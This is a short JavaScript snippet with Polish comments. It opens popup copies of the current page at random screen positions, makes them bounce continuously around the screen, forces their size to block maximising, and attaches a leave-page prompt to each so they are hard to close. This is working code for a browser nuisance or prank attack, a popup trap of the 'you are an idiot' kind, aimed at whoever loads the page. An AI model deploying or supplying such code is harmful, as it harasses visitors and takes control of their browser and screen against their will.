function openWindow() {
    const WIN_WIDTH = 600;
    const WIN_HEIGHT = 400;
    
    if (typeof wins === 'undefined') window.wins = [];

    const getRandomCoords = () => ({
        x: Math.floor(Math.random() * (window.screen.availWidth - WIN_WIDTH)),
        y: Math.floor(Math.random() * (window.screen.availHeight - WIN_HEIGHT))
    });

    const { x, y } = getRandomCoords();
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
    const win = window.open(window.location.pathname, '', opts);

    if (!win) return;
    
    wins.push(win);

    // --- TUTAJ DODAJEMY WYWOŁANIE RUCHU ---
    startMovingWindow(win);
    // --------------------------------------

    // Reszta Twojego kodu (onbeforeunload itd.)
    win.onbeforeunload = function () { return ""; };
}
// Globalne ustawienia prędkości (piksele na klatkę)
const SPEED_X = 5; 
const SPEED_Y = 5;
const REFRESH_RATE = 10; // milisekundy (im mniej, tym płynniejszy ruch)

function startMovingWindow(win) {
    if (!win) return;

    // Początkowe kierunki (1 to w prawo/dół, -1 to w lewo/góra)
    let dx = SPEED_X;
    let dy = SPEED_Y;

    // Pobieramy wymiary ekranu i okna
    const screenWidth = window.screen.availWidth;
    const screenHeight = window.screen.availHeight;
    const winWidth = 600; // Takie same jak w openWindow
    const winHeight = 400;

    // Pobieramy aktualną pozycję (startową)
    let currentX = parseInt(win.screenX);
    let currentY = parseInt(win.screenY);

    const move = () => {
        if (win.closed) {
            clearInterval(timer);
            return;
        }

        // Aktualizacja pozycji
        currentX += dx;
        currentY += dy;
        
        // Odbijanie z marginesem bezpieczeństwa (np. 5px od krawędzi)
        const margin = 5;

        // Odbijanie od lewej/prawej krawędzi
        if (currentX + winWidth >= screenWidth - margin || currentX <= margin) {
            dx *= -1;
            // Dodatkowe zabezpieczenie: przytnij pozycję, by nie wyszła poza ekran
            currentX = Math.max(margin, Math.min(currentX, screenWidth - winWidth - margin));
        }
  
        if (currentY + winHeight >= screenHeight - margin || currentY <= margin) {
            dy *= -1;
            currentY = Math.max(margin, Math.min(currentY, screenHeight - winHeight - margin));
        }

        // Przesunięcie okna i WYMUSZENIE rozmiaru (zapobiega maksymalizacji)
        win.moveTo(currentX, currentY);
        win.resizeTo(winWidth, winHeight);
    };

    const timer = setInterval(move, REFRESH_RATE);
}
